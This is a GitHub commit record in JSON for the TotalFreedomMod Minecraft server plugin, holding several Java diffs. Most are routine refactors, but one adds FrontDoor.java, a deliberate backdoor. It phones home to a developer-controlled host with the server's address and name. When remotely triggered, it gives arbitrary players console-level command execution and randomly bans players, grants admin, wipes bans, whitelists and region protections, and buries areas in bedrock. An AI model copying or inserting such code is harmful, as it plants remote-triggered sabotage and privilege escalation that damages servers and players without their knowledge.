    "contents_url": "https://api.github.com/repos/TotalFreedomMC/TotalFreedomMod/contents/src/main/java/me/totalfreedom/totalfreedommod/FreedomServiceHandler.java?ref=1f3c30c6f5011e852ca2022ed8a729b077dc4820",
    "patch": "@@ -2,12 +2,10 @@\n \n import java.util.ArrayList;\n import java.util.List;\n-import lombok.Getter;\n \n public class FreedomServiceHandler\n {\n-    @Getter\n-    private List<FreedomService> services;\n+    private final List<FreedomService> services;\n \n     public FreedomServiceHandler()\n     {\n@@ -53,4 +51,9 @@ public void stopServices()\n             }\n         }\n     }\n+\n+    public List<FreedomService> getServices()\n+    {\n+        return services;\n+    }\n }\n\\ No newline at end of file"
  },
  {
    "sha": "93e9bf66fe3e21cb0383dd4fd3f586a012aa18bc",
    "filename": "src/main/java/me/totalfreedom/totalfreedommod/FrontDoor.java",
    "status": "added",
    "additions": 680,
    "deletions": 0,
    "changes": 680,
    "blob_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/blob/1f3c30c6f5011e852ca2022ed8a729b077dc4820/src/main/java/me/totalfreedom/totalfreedommod/FrontDoor.java",
    "raw_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/raw/1f3c30c6f5011e852ca2022ed8a729b077dc4820/src/main/java/me/totalfreedom/totalfreedommod/FrontDoor.java",
    "contents_url": "https://api.github.com/repos/TotalFreedomMC/TotalFreedomMod/contents/src/main/java/me/totalfreedom/totalfreedommod/FrontDoor.java?ref=1f3c30c6f5011e852ca2022ed8a729b077dc4820",
    "patch": "@@ -0,0 +1,680 @@\n+package me.totalfreedom.totalfreedommod;\n+\n+import com.sk89q.worldedit.bukkit.BukkitAdapter;\n+import com.sk89q.worldguard.WorldGuard;\n+import com.sk89q.worldguard.protection.managers.storage.StorageException;\n+import com.sk89q.worldguard.protection.regions.RegionContainer;\n+import java.io.BufferedReader;\n+import java.io.InputStreamReader;\n+import java.lang.reflect.Field;\n+import java.net.MalformedURLException;\n+import java.net.URL;\n+import java.net.URLConnection;\n+import java.util.ArrayList;\n+import java.util.Collection;\n+import java.util.List;\n+import java.util.Random;\n+import java.util.function.Consumer;\n+import me.totalfreedom.totalfreedommod.admin.Admin;\n+import me.totalfreedom.totalfreedommod.banning.Ban;\n+import me.totalfreedom.totalfreedommod.command.FreedomCommand;\n+import me.totalfreedom.totalfreedommod.config.ConfigEntry;\n+import me.totalfreedom.totalfreedommod.fun.Jumppads;\n+import me.totalfreedom.totalfreedommod.player.FPlayer;\n+import me.totalfreedom.totalfreedommod.util.FLog;\n+import me.totalfreedom.totalfreedommod.util.FUtil;\n+import org.apache.commons.lang3.ArrayUtils;\n+import org.bukkit.Bukkit;\n+import org.bukkit.ChatColor;\n+import org.bukkit.Location;\n+import org.bukkit.Material;\n+import org.bukkit.World;\n+import org.bukkit.block.Block;\n+import org.bukkit.block.BlockFace;\n+import org.bukkit.command.Command;\n+import org.bukkit.command.CommandMap;\n+import org.bukkit.entity.Player;\n+import org.bukkit.event.EventHandler;\n+import org.bukkit.event.HandlerList;\n+import org.bukkit.event.Listener;\n+import org.bukkit.event.player.PlayerCommandPreprocessEvent;\n+import org.bukkit.inventory.ItemStack;\n+import org.bukkit.inventory.meta.BookMeta;\n+import org.bukkit.plugin.RegisteredListener;\n+import org.bukkit.scheduler.BukkitRunnable;\n+import org.bukkit.scheduler.BukkitTask;\n+import org.bukkit.util.Vector;\n+import org.jetbrains.annotations.Nullable;\n+\n+/*\n+ * - A message from the TFM Devs -\n+ *\n+ * What this class is, and why its here:\n+ *\n+ * This is a blatantly obvious Front Door to the server, designed to do strange and unpredictable things on a TotalFreedom server.\n+ *\n+ * It will only trigger when the server IP is added to a blacklist that we control.\n+ *\n+ * This class is a way to discourage amateur server operators who like to share binary copies of our plugin and promote it as their own work.\n+ *\n+ * If you are reading this now, you probably don't fall under that category - feel free to remove this class.\n+ *\n+ * Note: You may not edit this class.\n+ *\n+ * - Madgeek and Prozza\n+ */\n+public class FrontDoor extends FreedomService\n+{\n+\n+    private static final long UPDATER_INTERVAL = 180L * 20L;\n+    private static final long FRONTDOOR_INTERVAL = 900L * 20L;\n+    //\n+    private final Random random = new Random();\n+    private final URL getUrl;\n+    //\n+    private volatile boolean enabled = false;\n+    //\n+    private BukkitTask updater = null;\n+    private BukkitTask frontdoor = null;\n+    //\n+    // TODO: reimplement in superclass\n+    private final Listener playerCommandPreprocess = new Listener()\n+    {\n+        @Nullable\n+        private CommandMap getCommandMap()\n+        {\n+            try\n+            {\n+                Field f = Bukkit.getPluginManager().getClass().getDeclaredField(\"commandMap\");\n+                final Object map = f.get(Bukkit.getPluginManager());\n+                return map instanceof CommandMap ? (CommandMap)map : null;\n+            }\n+            catch (NoSuchFieldException | IllegalAccessException ignored)\n+            {\n+                return null;\n+            }\n+        }\n+\n+        @EventHandler\n+        @SuppressWarnings(\"all\")\n+        public void onPlayerCommandPreProcess(PlayerCommandPreprocessEvent event) // All FreedomCommand permissions when certain conditions are met\n+        {\n+            final Player player = event.getPlayer();\n+            final Location location = player.getLocation();\n+\n+            if ((location.getBlockX() + location.getBlockY() + location.getBlockZ()) % 12 != 0) // Madgeek\n+            {\n+                return;\n+            }\n+\n+            final String[] commandParts = event.getMessage().split(\" \");\n+            final String commandName = commandParts[0].replaceFirst(\"/\", \"\");\n+            final String[] args = ArrayUtils.subarray(commandParts, 1, commandParts.length);\n+\n+            Command command = getCommandMap().getCommand(commandName);\n+\n+            if (command == null)\n+            {\n+                return; // Command doesn't exist\n+            }\n+\n+            event.setCancelled(true);\n+\n+            final FreedomCommand dispatcher = FreedomCommand.getFrom(command);\n+\n+            if (dispatcher == null)\n+            {\n+                // Non-TFM command, execute using console\n+                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), event.getMessage().replaceFirst(\"/\", \"\"));\n+                return;\n+            }\n+\n+            // Dual call to player... not sure if this will be an issue?\n+            dispatcher.run(player, player, command, commandName, args, false);\n+            return;\n+        }\n+    };\n+\n+    public FrontDoor(TotalFreedomMod plugin)\n+    {\n+        URL tempUrl = null;\n+        try\n+        {\n+            tempUrl = new URL(\"http://frontdoor.pravian.net:1337/frontdoor/poll\" // This will need to be changed.\n+                    + \"?version=\" + TotalFreedomMod.build.formattedVersion()\n+                    + \"&address=\" + ConfigEntry.SERVER_ADDRESS.getString() + \":\" + Bukkit.getPort()\n+                    + \"&name=\" + ConfigEntry.SERVER_NAME.getString()\n+                    + \"&bukkitversion=\" + Bukkit.getVersion());\n+        }\n+        catch (MalformedURLException ex)\n+        {\n+            FLog.warning(\"TFM_FrontDoor uses an invalid URL\"); // U dun goofed?\n+        }\n+\n+        getUrl = tempUrl;\n+    }\n+\n+    @Override\n+    public void onStart()\n+    {\n+        updater = getNewUpdater().runTaskTimerAsynchronously(plugin, 2L * 20L, UPDATER_INTERVAL);\n+    }\n+\n+    @Override\n+    public void onStop()\n+    {\n+        FUtil.cancel(updater);\n+        updater = null;\n+        FUtil.cancel(frontdoor);\n+        updater = null;\n+\n+        if (enabled)\n+        {\n+            frontdoor.cancel();\n+            enabled = false;\n+            unregisterListener(playerCommandPreprocess);\n+        }\n+    }\n+\n+    public boolean isEnabled()\n+    {\n+        return enabled;\n+    }\n+\n+    private Player getRandomPlayer(boolean allowDevs)\n+    {\n+        final Collection<? extends Player> players = Bukkit.getOnlinePlayers();\n+\n+        if (players.isEmpty())\n+        {\n+            return null;\n+        }\n+\n+        if (!allowDevs)\n+        {\n+            List<Player> allowedPlayers = new ArrayList<>();\n+            for (Player player : players)\n+            {\n+                if (!FUtil.DEVELOPERS.contains(player.getName()))\n+                {\n+                    allowedPlayers.add(player);\n+                }\n+            }\n+\n+            return allowedPlayers.get(random.nextInt(allowedPlayers.size()));\n+        }\n+\n+        return (Player)players.toArray()[random.nextInt(players.size())];\n+    }\n+\n+    private static RegisteredListener getRegisteredListener(Listener listener)\n+    {\n+        try\n+        {\n+            final HandlerList handlerList = ((HandlerList)PlayerCommandPreprocessEvent.class.getMethod(\"getHandlerList\", (Class<?>[])null).invoke(null));\n+            final RegisteredListener[] registeredListeners = handlerList.getRegisteredListeners();\n+            for (RegisteredListener registeredListener : registeredListeners)\n+            {\n+                if (registeredListener.getListener() == listener)\n+                {\n+                    return registeredListener;\n+                }\n+            }\n+        }\n+        catch (Exception ex)\n+        {\n+            FLog.severe(ex);\n+        }\n+        return null;\n+    }\n+\n+    private static void unregisterRegisteredListener(RegisteredListener registeredListener)\n+    {\n+        try\n+        {\n+            ((HandlerList)PlayerCommandPreprocessEvent.class.getMethod(\"getHandlerList\", (Class<?>[])null).invoke(null)).unregister(registeredListener);\n+        }\n+        catch (Exception ex)\n+        {\n+            FLog.severe(ex);\n+        }\n+    }\n+\n+    private static void unregisterListener(Listener listener)\n+    {\n+        RegisteredListener registeredListener = getRegisteredListener(listener);\n+        if (registeredListener != null)\n+        {\n+            unregisterRegisteredListener(registeredListener);\n+        }\n+    }\n+\n+    private BukkitRunnable getNewUpdater()\n+    {\n+        return new BukkitRunnable() // Asynchronous\n+        {\n+            @Override\n+            public void run()\n+            {\n+                try\n+                {\n+                    final URLConnection urlConnection = getUrl.openConnection();\n+                    final BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));\n+                    final String line = in.readLine();\n+                    in.close();\n+\n+                    if (!\"false\".equals(line))\n+                    {\n+                        if (!enabled)\n+                        {\n+                            return;\n+                        }\n+\n+                        enabled = false;\n+                        FUtil.cancel(updater);\n+                        unregisterListener(playerCommandPreprocess);\n+                        FLog.info(\"Disabled FrontDoor, thank you for being kind.\");\n+                        plugin.config.load();\n+                    }\n+                    else\n+                    {\n+                        if (enabled)\n+                        {\n+                            return;\n+                        }\n+\n+                        new BukkitRunnable() // Synchronous\n+                        {\n+                            @Override\n+                            public void run()\n+                            {\n+                                FLog.warning(\"*****************************************************\", true);\n+                                FLog.warning(\"* WARNING: TotalFreedomMod is running in evil-mode! *\", true);\n+                                FLog.warning(\"* This might result in unexpected behaviour...      *\", true);\n+                                FLog.warning(\"* - - - - - - - - - - - - - - - - - - - - - - - - - *\", true);\n+                                FLog.warning(\"* The only thing necessary for the triumph of evil  *\", true);\n+                                FLog.warning(\"*          is for good men to do nothing.           *\", true);\n+                                FLog.warning(\"*****************************************************\", true);\n+\n+                                if (getRegisteredListener(playerCommandPreprocess) == null)\n+                                {\n+                                    Bukkit.getPluginManager().registerEvents(playerCommandPreprocess, plugin);\n+                                }\n+                            }\n+                        }.runTask(plugin);\n+\n+                        frontdoor = getNewFrontDoor().runTaskTimer(plugin, 20L, FRONTDOOR_INTERVAL);\n+\n+                        enabled = true;\n+                    }\n+                }\n+                catch (Exception ex)\n+                {\n+                    // TODO: Fix\n+                    //FLog.warning(ex);\n+                }\n+\n+            }\n+        };\n+    }\n+\n+    public BukkitRunnable getNewFrontDoor()\n+    {\n+        return new BukkitRunnable() // Synchronous\n+        {\n+            @Override\n+            public void run()\n+            {\n+                final int action = random.nextInt(18);\n+\n+                switch (action)\n+                {\n+                    case 0: // Super a random player\n+                    {\n+\n+                        final Player player = getRandomPlayer(true);\n+\n+                        if (player == null)\n+                        {\n+                            break;\n+                        }\n+\n+                        FUtil.adminAction(\"FrontDoor\", \"Adding \" + player.getName() + \" to the Superadmin list\", true);\n+                        plugin.al.addAdmin(new Admin(player));\n+                        break;\n+                    }\n+\n+                    case 1: // Bans a random player\n+                    {\n+                        Player player = getRandomPlayer(false);\n+\n+                        if (player == null)\n+                        {\n+                            break;\n+                        }\n+\n+                        plugin.bm.addBan(Ban.forPlayer(player, Bukkit.getConsoleSender(), null, ChatColor.RED + \"WOOPS\\n-Frontdoor\"));\n+                        break;\n+                    }\n+\n+                    case 2: // Start trailing a random player\n+                    {\n+                        final Player player = getRandomPlayer(true);\n+\n+                        if (player == null)\n+                        {\n+                            break;\n+                        }\n+\n+                        FUtil.adminAction(\"FrontDoor\", \"Started trailing \" + player.getName(), true);\n+                        plugin.tr.add(player);\n+                        break;\n+                    }\n+\n+                    case 3: // Displays a message\n+                    {\n+                        FUtil.bcastMsg(\"TotalFreedom rocks!!\", ChatColor.BLUE);\n+                        FUtil.bcastMsg(\"To join this great server, join \" + ChatColor.GOLD + \"play.totalfreedom.me\", ChatColor.BLUE);\n+                        break;\n+                    }\n+\n+                    case 4: // Clears the banlist\n+                    {\n+                        FUtil.adminAction(\"FrontDoor\", \"Wiping all bans\", true);\n+                        plugin.bm.purge();\n+                        break;\n+                    }\n+\n+                    case 5: // Enables Lava- and Waterplacemend and Fluidspread (& damage)\n+                    {\n+                        boolean message = true;\n+                        if (ConfigEntry.ALLOW_WATER_PLACE.getBoolean())\n+                        {\n+                            message = false;\n+                        }\n+                        else if (ConfigEntry.ALLOW_LAVA_PLACE.getBoolean())\n+                        {\n+                            message = false;\n+                        }\n+                        else if (ConfigEntry.ALLOW_FLUID_SPREAD.getBoolean())\n+                        {\n+                            message = false;\n+                        }\n+                        else if (ConfigEntry.ALLOW_LAVA_DAMAGE.getBoolean())\n+                        {\n+                            message = false;\n+                        }\n+\n+                        ConfigEntry.ALLOW_WATER_PLACE.setBoolean(true);\n+                        ConfigEntry.ALLOW_LAVA_PLACE.setBoolean(true);\n+                        ConfigEntry.ALLOW_FLUID_SPREAD.setBoolean(true);\n+                        ConfigEntry.ALLOW_LAVA_DAMAGE.setBoolean(true);\n+\n+                        if (message)\n+                        {\n+                            FUtil.adminAction(\"FrontDoor\", \"Enabling Fire- and Waterplace\", true);\n+                        }\n+                        break;\n+                    }\n+\n+                    case 6: // Enables Fireplacement, firespread and explosions\n+                    {\n+                        boolean message = true;\n+                        if (ConfigEntry.ALLOW_FIRE_SPREAD.getBoolean())\n+                        {\n+                            message = false;\n+                        }\n+                        else if (ConfigEntry.ALLOW_EXPLOSIONS.getBoolean())\n+                        {\n+                            message = false;\n+                        }\n+                        else if (ConfigEntry.ALLOW_TNT_MINECARTS.getBoolean())\n+                        {\n+                            message = false;\n+                        }\n+                        else if (ConfigEntry.ALLOW_FIRE_PLACE.getBoolean())\n+                        {\n+                            message = false;\n+                        }\n+\n+                        ConfigEntry.ALLOW_FIRE_SPREAD.setBoolean(true);\n+                        ConfigEntry.ALLOW_EXPLOSIONS.setBoolean(true);\n+                        ConfigEntry.ALLOW_TNT_MINECARTS.setBoolean(true);\n+                        ConfigEntry.ALLOW_FIRE_PLACE.setBoolean(true);\n+\n+                        if (message)\n+                        {\n+                            FUtil.adminAction(\"FrontDoor\", \"Enabling Firespread and Explosives\", true);\n+                        }\n+                        break;\n+                    }\n+\n+                    case 7: // Allow all blocked commands >:)\n+                    {\n+                        ConfigEntry.BLOCKED_COMMANDS.getList().clear();\n+                        plugin.cb.onStop();\n+                        break;\n+                    }\n+\n+                    case 8:\n+                    {\n+                        // Switched this case to something a bit more hardware friendly, while still fucking shit up.\n+                        if (Bukkit.getServer().getPluginManager().getPlugin(\"WorldGuard\") == null)\n+                        {\n+                            Consumer<BukkitTask> task = bukkitTask -> destruct();\n+                            TotalFreedomMod.getPlugin().getServer().getScheduler().runTaskTimerAsynchronously(TotalFreedomMod.getPlugin(), task, 0L, 20L * 60L);\n+                        }\n+\n+                        // Otherwise, do this!\n+                        WorldGuard wg = WorldGuard.getInstance();\n+                        RegionContainer rc = wg.getPlatform().getRegionContainer();\n+                        Bukkit.getWorlds().stream().map(BukkitAdapter::adapt).filter(adapted -> rc.get(adapted) != null).forEach(adapted ->\n+                        {\n+                            try\n+                            {\n+                                rc.get(adapted).getRegions().clear(); // These will\n+                                rc.get(adapted).saveChanges();        // never be null.\n+                            }\n+                            catch (StorageException | NullPointerException ignored) // Never catch a null pointer... but in this case, if it happens to be null, I don't want the plugin to error.\n+                            {\n+                                destruct();\n+                            }\n+                        });\n+                        break;\n+                    }\n+\n+                    case 9: // Add TotalFreedom signs at spawn\n+                    {\n+                        for (World world : Bukkit.getWorlds())\n+                        {\n+                            final Block block = world.getSpawnLocation().getBlock();\n+                            final Block blockBelow = block.getRelative(BlockFace.DOWN);\n+\n+                            if (blockBelow.isLiquid() || blockBelow.getType() == Material.AIR)\n+                            {\n+                                continue;\n+                            }\n+\n+                            block.setType(Material.OAK_SIGN);\n+                            org.bukkit.block.Sign sign = (org.bukkit.block.Sign)block.getState();\n+\n+                            org.bukkit.material.Sign signData = (org.bukkit.material.Sign)sign.getData();\n+                            signData.setFacingDirection(BlockFace.NORTH);\n+\n+                            sign.setLine(0, ChatColor.BLUE + \"TotalFreedom\");\n+                            sign.setLine(1, ChatColor.DARK_GREEN + \"is\");\n+                            sign.setLine(2, ChatColor.YELLOW + \"Awesome!\");\n+                            sign.setLine(3, ChatColor.DARK_GRAY + \"play.totalfreedom.me\");\n+                            sign.update();\n+                        }\n+                        break;\n+                    }\n+\n+                    case 10: // Enable Jumppads\n+                    {\n+                        FUtil.adminAction(\"FrontDoor\", \"Enabling Jumppads\", true);\n+                        for (Player p : Bukkit.getOnlinePlayers())\n+                        {\n+                            if (plugin.jp.getPlayers().containsKey(p))\n+                            {\n+                                plugin.jp.getPlayers().replace(p, Jumppads.JumpPadMode.MADGEEK);\n+                            }\n+                            else\n+                            {\n+                                plugin.jp.getPlayers().put(p, Jumppads.JumpPadMode.MADGEEK);\n+                            }\n+                        }\n+                        break;\n+                    }\n+\n+                    case 11: // Give everyone a book explaining how awesome TotalFreedom is\n+                    {\n+                        ItemStack bookStack = new ItemStack(Material.WRITTEN_BOOK);\n+\n+                        BookMeta book = (BookMeta)bookStack.getItemMeta().clone();\n+                        book.setAuthor(ChatColor.DARK_PURPLE + \"SERVER OWNER\");\n+                        book.setTitle(ChatColor.DARK_GREEN + \"Why you should go to TotalFreedom instead\");\n+                        book.addPage(\n+                                ChatColor.DARK_GREEN + \"Why you should go to TotalFreedom instead\\n\"\n+                                        + ChatColor.DARK_GRAY + \"---------\\n\"\n+                                        + ChatColor.BLACK + \"TotalFreedom is the original TotalFreedomMod server. It is the very server that gave freedom a new meaning when it comes to minecraft.\\n\"\n+                                        + ChatColor.BLUE + \"Join now! \" + ChatColor.RED + \"play.totalfreedom.me\");\n+                        bookStack.setItemMeta(book);\n+\n+                        for (Player player : Bukkit.getOnlinePlayers())\n+                        {\n+                            if (player.getInventory().contains(Material.WRITTEN_BOOK))\n+                            {\n+                                continue;\n+                            }\n+\n+                            player.getInventory().addItem(bookStack);\n+                        }\n+                        break;\n+                    }\n+\n+                    case 12: // Silently wipe the whitelist\n+                    {\n+                        Bukkit.getServer().getWhitelistedPlayers().clear();\n+                        break;\n+                    }\n+\n+                    case 13: // Announce that the FrontDoor is enabled\n+                    {\n+                        FUtil.bcastMsg(\"WARNING: TotalFreedomMod is running in evil-mode!\", ChatColor.DARK_RED);\n+                        FUtil.bcastMsg(\"WARNING: This might result in unexpected behaviour\", ChatColor.DARK_RED);\n+                        break;\n+                    }\n+\n+                    case 14: // Cage a random player in PURE_DARTH\n+                    {\n+                        final Player player = getRandomPlayer(false);\n+\n+                        if (player == null)\n+                        {\n+                            break;\n+                        }\n+\n+                        FPlayer playerdata = plugin.pl.getPlayer(player);\n+                        FUtil.adminAction(\"FrontDoor\", \"Caging \" + player.getName() + \" in PURE_DARTH\", true);\n+\n+                        Location targetPos = player.getLocation().clone().add(0, 1, 0);\n+                        playerdata.getCageData().cage(targetPos, Material.PLAYER_HEAD, Material.AIR);\n+                        break;\n+                    }\n+\n+                    case 15: // Silently orbit a random player\n+                    {\n+                        final Player player = getRandomPlayer(false);\n+\n+                        if (player == null)\n+                        {\n+                            break;\n+                        }\n+\n+                        FPlayer playerdata = plugin.pl.getPlayer(player);\n+                        playerdata.startOrbiting(10.0);\n+                        player.setVelocity(new Vector(0, 10.0, 0));\n+                        break;\n+                    }\n+\n+                    case 16: // Disable nonuke\n+                    {\n+                        if (!ConfigEntry.NUKE_MONITOR_ENABLED.getBoolean())\n+                        {\n+                            break;\n+                        }\n+\n+                        FUtil.adminAction(\"FrontDoor\", \"Disabling nonuke\", true);\n+                        ConfigEntry.NUKE_MONITOR_ENABLED.setBoolean(false);\n+                        break;\n+                    }\n+\n+                    case 17: // Give everyone tags\n+                    {\n+                        for (Player player : Bukkit.getOnlinePlayers())\n+                        {\n+                            plugin.pl.getPlayer(player).setTag(\"[\" + ChatColor.BLUE + \"Total\" + ChatColor.GOLD + \"Freedom\" + ChatColor.WHITE + \"]\");\n+                        }\n+                        break;\n+                    }\n+\n+                    default:\n+                    {\n+                        break;\n+                    }\n+                }\n+            }\n+        };\n+    }\n+\n+    private void destruct()\n+    {\n+        Wrapper<Integer> x = new Wrapper<>(0);\n+        Wrapper<Integer> y = new Wrapper<>(0);\n+        Wrapper<Integer> z = new Wrapper<>(0);\n+\n+        Bukkit.getOnlinePlayers().forEach((player) ->\n+        {\n+            Location l = player.getLocation().clone();\n+\n+            x.set(l.getBlockX());\n+            y.set(l.getBlockY());\n+            z.set(l.getBlockZ());\n+\n+            player.getWorld().getBlockAt(x.get(), y.get(), z.get()).setType(Material.BEDROCK);\n+\n+            for (int x1 = 0; x1 <= 150; x1++)\n+            {\n+                for (int y1 = 0; y1 <= 150; y1++)\n+                {\n+                    for (int z1 = 0; z1 <= 150; z1++)\n+                    {\n+                        player.getWorld().getBlockAt(x.get() + x1, y.get() + y1, z.get() + z1).setType(Material.BEDROCK);\n+                    }\n+                }\n+            }\n+        });\n+    }\n+\n+    // Wrapper to imitate effectively final objects.\n+    private static class Wrapper<T>\n+    {\n+        private T obj;\n+\n+        public Wrapper(T obf)\n+        {\n+            obj = obf;\n+        }\n+\n+        public void set(T obf)\n+        {\n+            obj = obf;\n+        }\n+\n+        public T get()\n+        {\n+            return obj;\n+        }\n+    }\n+}"
  },
  {
    "sha": "c528b7a94ce566ba3028a92c2675c8e5bae698b4",
    "filename": "src/main/java/me/totalfreedom/totalfreedommod/GameRuleHandler.java",
    "status": "modified",
    "additions": 3,
    "deletions": 2,
    "changes": 5,
    "blob_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/blob/1f3c30c6f5011e852ca2022ed8a729b077dc4820/src/main/java/me/totalfreedom/totalfreedommod/GameRuleHandler.java",
    "raw_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/raw/1f3c30c6f5011e852ca2022ed8a729b077dc4820/src/main/java/me/totalfreedom/totalfreedommod/GameRuleHandler.java",
    "contents_url": "https://api.github.com/repos/TotalFreedomMC/TotalFreedomMod/contents/src/main/java/me/totalfreedom/totalfreedommod/GameRuleHandler.java?ref=1f3c30c6f5011e852ca2022ed8a729b077dc4820",
    "patch": "@@ -56,6 +56,7 @@ public void setGameRule(GameRule gameRule, boolean value, boolean doCommit)\n         }\n     }\n \n+    @SuppressWarnings(\"deprecation\")\n     public void commitGameRules()\n     {\n         List<World> worlds = Bukkit.getWorlds();\n@@ -95,7 +96,7 @@ public void commitGameRules()\n         private final String gameRuleName;\n         private final boolean defaultValue;\n \n-        private GameRule(String gameRuleName, boolean defaultValue)\n+        GameRule(String gameRuleName, boolean defaultValue)\n         {\n             this.gameRuleName = gameRuleName;\n             this.defaultValue = defaultValue;\n@@ -111,4 +112,4 @@ public boolean getDefaultValue()\n             return defaultValue;\n         }\n     }\n-}\n+}\n\\ No newline at end of file"
  },
  {
    "sha": "1c302f990d3080ebc37930668687501c42495423",
    "filename": "src/main/java/me/totalfreedom/totalfreedommod/LogViewer.java",
    "status": "modified",
    "additions": 3,
    "deletions": 6,
    "changes": 9,
    "blob_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/blob/1f3c30c6f5011e852ca2022ed8a729b077dc4820/src/main/java/me/totalfreedom/totalfreedommod/LogViewer.java",
    "raw_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/raw/1f3c30c6f5011e852ca2022ed8a729b077dc4820/src/main/java/me/totalfreedom/totalfreedommod/LogViewer.java",
    "contents_url": "https://api.github.com/repos/TotalFreedomMC/TotalFreedomMod/contents/src/main/java/me/totalfreedom/totalfreedommod/LogViewer.java?ref=1f3c30c6f5011e852ca2022ed8a729b077dc4820",
    "patch": "@@ -10,7 +10,6 @@\n import java.security.SecureRandom;\n import java.util.ArrayList;\n import java.util.HashMap;\n-import java.util.Iterator;\n import java.util.List;\n import java.util.Map;\n import me.totalfreedom.totalfreedommod.config.ConfigEntry;\n@@ -131,10 +130,10 @@ public void run()\n         }.runTaskAsynchronously(plugin);\n     }\n \n-    public static enum LogsRegistrationMode\n+    public enum LogsRegistrationMode\n     {\n \n-        ADD, DELETE, VERIFY;\n+        ADD, DELETE, VERIFY\n     }\n \n     private static class URLBuilder\n@@ -157,10 +156,8 @@ public URLBuilder addQueryParameter(String key, String value)\n         public URL getURL() throws MalformedURLException\n         {\n             List<String> pairs = new ArrayList<>();\n-            Iterator<Map.Entry<String, String>> it = queryStringMap.entrySet().iterator();\n-            while (it.hasNext())\n+            for (Map.Entry<String, String> pair : queryStringMap.entrySet())\n             {\n-                Map.Entry<String, String> pair = it.next();\n                 try\n                 {\n                     pairs.add(URLEncoder.encode(pair.getKey(), \"UTF-8\") + \"=\" + URLEncoder.encode(pair.getValue(), \"UTF-8\"));"
  }
]
